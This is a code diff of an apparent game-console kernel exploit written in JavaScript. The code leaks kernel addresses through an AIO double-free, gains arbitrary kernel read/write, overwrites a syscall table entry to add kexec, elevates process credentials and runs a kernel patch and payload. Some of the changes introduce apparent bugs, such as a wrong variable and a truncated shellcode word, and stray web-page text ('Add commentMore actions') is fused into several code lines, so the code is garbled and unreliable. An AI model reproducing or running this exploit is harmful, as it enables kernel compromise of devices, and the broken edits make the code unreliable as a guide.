@@ -729,7 +729,7 @@ function leak_kernel_addrs(sd_pair) {
 
   log("find aio_entry");
   let reqs2_off = null;
-  loop: for (let i = 0; i < num_leaks; i++) {
+  for (let i = 0; i < num_leaks; i++) {
     get_rthdr(sd, buf);
 
     spray_aio(num_handles, leak_reqs_p, num_elems, leak_ids_p, true, AIO_CMD_WRITE);
@@ -739,10 +739,11 @@ function leak_kernel_addrs(sd_pair) {
       if (verify_reqs2(buf, off)) {
         reqs2_off = off;
         log(`found reqs2 at attempt: ${i}`);
-        break loop;
+        break;
       }
     }
 
+    if (reqs2_off !== null) break;
     free_aios(leak_ids_p, leak_ids_len);
   }
   if (reqs2_off === null) {
@@ -887,7 +888,7 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
   let req_id = null;
   close(sd);
   sd = null;
-  loop: for (let i = 0; i < num_alias; i++) {
+  for (let i = 0; i < num_alias; i++) {
     for (const sd of sds) {
       set_rthdr(sd, reqs2, rsize);
     }
@@ -911,14 +912,14 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
 
         poll_aio(req_id, states);
         log(`states[${req_idx}]: ${hex(states[0])}`);
-        for (let i = 0; i < num_sds; i++) {
-          const sd2 = sds[i];
+        for (let j = 0; j < num_sds; j++) {
+          const sd2 = sds[j];
           get_rthdr(sd2, reqs2);
           const done = reqs2[reqs3_off + 0xc];
           if (done) {
             hexdump(reqs2);
             sd = sd2;
-            sds.splice(i, 1);
+            sds.splice(j, 1);
             free_rthdrs(sds);
             sds.push(new_socket());
             break;
@@ -929,9 +930,10 @@ function double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd, sds) {
         }
         log(`sd: ${sd}`);
 
-        break loop;
+        break;
       }
     }
+    if (req_id !== null) break;
   }
   if (req_id === null) {
     die("failed to overwrite AIO queue entry");
@@ -987,9 +989,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   let reclaim_sd = null;
   close(pktopts_sds[1]);
   for (let i = 0; i < num_alias; i++) {
-    for (let i = 0; i < num_sds; i++) {
-      pktopts.write32(off_tclass, 0x4141 | (i << 16));
-      set_rthdr(sds[i], pktopts, rsize);
+    for (let j = 0; j < num_sds; j++) {
+      pktopts.write32(off_tclass, 0x4141 | (j << 16));
+      set_rthdr(sds[j], pktopts, rsize);
     }
 
     gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
@@ -1112,7 +1114,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
   const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
   log(`worker sock pointer: ${worker_sock}`);
-  const w_pcb = kread64(worker_sock.add(0x18));
+  const w_pcb = kread64(worker_sd.add(0x18));
   log(`worker sock pcb: ${w_pcb}`);
   const w_pktopts = kread64(w_pcb.add(0x118));
   log(`worker pktopts: ${w_pktopts}`);
@@ -1283,21 +1285,27 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
   log("change sys_aio_submit() to sys_kexec()");
   const sysent_661 = kbase.add(off_sysent_661);
-  const sysent_661_save = new Buffer(0x30);
-  for (let off = 0; off < sysent_661_save.size; off += 8) {
-    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
+  const sysent_size = 0x30;Add commentMore actions
+  const sysent_save = new Buffer(sysent_size);
+  for (let off = 0; off < sysent_size; off += 8) {
+    sysent_save.write64(off, kmem.read64(sysent_661.add(off)));
   }
-  log(`sysent[611] save addr: ${sysent_661_save.addr}`);
-  log("sysent[611] save data:");
-  hexdump(sysent_661_save);
-  kmem.write32(sysent_661, 6);
-  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
-  kmem.write32(sysent_661.add(0x2c), 1);
+  log(`sysent[661] saved at addr: ${sysent_save.addr}`);
+  log("sysent[661] saved data:");
+  hexdump(sysent_save);
 
-  log("set the bits for JIT privs");
-  kmem.write64(p_ucred.add(0x60), -1);
-  kmem.write64(p_ucred.add(0x68), -1);
+  kmem.write32(sysent_661, 6); // nargs
+  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi)); // sys_kexec
+  kmem.write32(sysent_661.add(0x2c), 1); // sy_flags
 
+  // Grant JIT privileges
+  log("Setting JIT privileges");
+  kmem.write64(p_ucred.add(0x60), -1); // cr_uid, cr_ruid, cr_svuid
+  kmem.write64(p_ucred.add(0x68), -1); // cr_rgid, cr_svgid
+
+  // Load and validate patch binary
+  log("Loading kernel patch binary");
+  const max_size = 0x10000000;
   const buf = await get_binary(patch_elf_loc);
   const patches = new View1(buf);
   let map_size = patches.size;
@@ -1308,55 +1316,68 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
   if (map_size === 0) {
     die("patch file size is zero");
   }
-  log(`kpatch size: ${map_size} bytes`);
-  map_size = (map_size + page_size) & -page_size;
+  log(`Kernel patch size: ${map_size} bytes`);
+  map_size = (map_size + page_size - 1) & ~(page_size - 1); // Align to page size
 
-  const prot_rw = 3;
-  const prot_rx = 5;
-  const prot_rwx = 7;
-  const exec_p = new Int(0, 9);
-  const write_p = new Int(max_size, 9);
+  // JIT shared memory setupAdd commentMore actions
+  const PROT_RW = PROT_READ | PROT_WRITE;
+  const PROT_RX = PROT_READ | PROT_EXEC;
+  const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
+  const exec_addr = new Int(0, 9); // Base address for executable mapping
+  const write_addr = new Int(map_size, 9); // Base address for writable mapping
 
-  log("open JIT fds")
-  const exec_fd = sysi("jitshm_create", 0, map_size, prot_rwx);
-  const write_fd = sysi("jitshm_alias", exec_fd, prot_rw);
-
-  log("mmap for kpatch shellcode");
-  const exec_addr = chain.sysp("mmap", exec_p, map_size, prot_rx, MAP_SHARED | MAP_FIXED, exec_fd, 0);
-  const write_addr = chain.sysp("mmap", write_p, map_size, prot_rw, MAP_SHARED | MAP_FIXED, write_fd, 0);
-
-  log(`exec_addr: ${exec_addr}`);
-  log(`write_addr: ${write_addr}`);
-  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
-    die("mmap() for jit failed");
+  log("Creating JIT shared memory");Add commentMore actions
+  const exec_fd = sysi("jitshm_create", 0, map_size, PROT_RWX);
+  const write_fd = sysi("jitshm_alias", exec_fd, PROT_RW);
+  if (exec_fd < 0 || write_fd < 0) {
+    die("Failed to create JIT shared memory");
   }
 
-  log("mlock exec_addr for kernel exec");
-  sysi("mlock", exec_addr, map_size);
+  // Map JIT memoryAdd commentMore actions
+  log("Mapping JIT memory for kernel patch");
+  const exec_map = chain.sysp("mmap", exec_addr, map_size, PROT_RX, MAP_SHARED | MAP_FIXED, exec_fd, 0);
+  const write_map = chain.sysp("mmap", write_addr, map_size, PROT_RW, MAP_SHARED | MAP_FIXED, write_fd, 0);
+  log(`Executable mapping at: ${exec_map}`);
+  log(`Writable mapping at: ${write_map}`);
 
+  if (exec_map.ne(exec_addr) || write_map.ne(write_addr)) {Add commentMore actions
+    die("JIT memory mapping failed");
+  }
+
+  // Lock executable mappingAdd commentMore actions
+  log("Locking executable mapping");
+  sysi("mlock", exec_map, map_size);
+
+  // Test JIT executionAdd commentMore actions
+  log("Testing JIT execution");
   const test_code = new Int(0x001337b8, 0xc300);
-  write_addr.write64(0, test_code);
-
-  log("test jit exec");
-  sys_void("kexec", exec_addr);
-  let retval = chain.errno;
-  log("returned successfully");
-
-  log(`jit retval: ${retval}`);
+  kmem.copyin(test_code.addr, write_map, 8);Add commentMore actions
+  sys_void("kexec", exec_map);
+  const retval = chain.errno;
+  log(`JIT test return value: ${retval}`);
   if (retval !== 0x1337) {
-    die("test jit exec failed");
+    die("JIT execution test failed");
   }
 
-  log("mlock saved data for kernel restore");
+  // Lock restore dataAdd commentMore actions
+  log("Locking restore data");
   const pipe_save = restore_info[1];
   restore_info[1] = pipe_save.addr;
   sysi("mlock", restore_info[1], page_size);
-  restore_info[4] = sysent_661_save.addr;
+  restore_info[4] = sysent_save.addr;
   sysi("mlock", restore_info[4], page_size);
 
-  log("execute kpatch...")
-  mem.cpy(write_addr, patches.addr, patches.size);
-  sys_void("kexec", exec_addr, ...restore_info);
+  // Copy and execute patchAdd commentMore actions
+  log("Copying and executing kernel patch");
+  kmem.copyin(patches.addr, write_map, patches.size);
+  sys_void("kexec", exec_map, ...restore_info);
+
+  // Cleanup JIT mappings
+  log("Cleaning up JIT mappings");
+  sysi("munmap", exec_map, map_size);
+  sysi("munmap", write_map, map_size);
+  sysi("close", exec_fd);
+  sysi("close", write_fd);
 }
 
 function setup(block_fd) {
@@ -1519,7 +1540,7 @@ function runBinLoader() {
   loader_writer[16] = 0x000095e8;
   loader_writer[17] = 0xff894400;
   loader_writer[18] = 0x000001be;
-  loader_writer[19] = 0x0095e800;
+  loader_writer[19] = 0x0095e8;
   loader_writer[20] = 0x89440000;
   loader_writer[21] = 0x31f631ff;
   loader_writer[22] = 0x0062e8d2;
@@ -1614,7 +1635,6 @@ function runPayload(path) {
 kexploit().then((success) => {
   if (success) {
     const payloadFile = getPayloadFile(version);
-    log(`loading payload for firmware ${hex(version)}: ${payloadFile}`);
     runPayload(`./${payloadFile}`);
   }
 });
